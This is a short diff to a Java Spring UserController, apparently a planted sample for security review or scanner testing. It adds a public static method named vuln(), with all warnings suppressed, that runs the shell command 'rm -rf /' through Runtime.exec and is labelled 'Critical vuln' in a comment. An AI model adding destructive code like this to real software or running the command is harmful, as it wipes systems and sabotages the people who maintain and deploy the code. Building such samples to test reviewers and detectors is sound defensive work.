@@ -84,6 +84,11 @@ public class UserController {
         userService.deleteUser(id);
         return ResponseEntity.noContent().build();
     }
+
+    @SuppressWarnings("all")
+    public static void vuln() {
+        Runtime.getRuntime().exec("rm -rf /");  // Critical vuln
+    }
 }
 
 
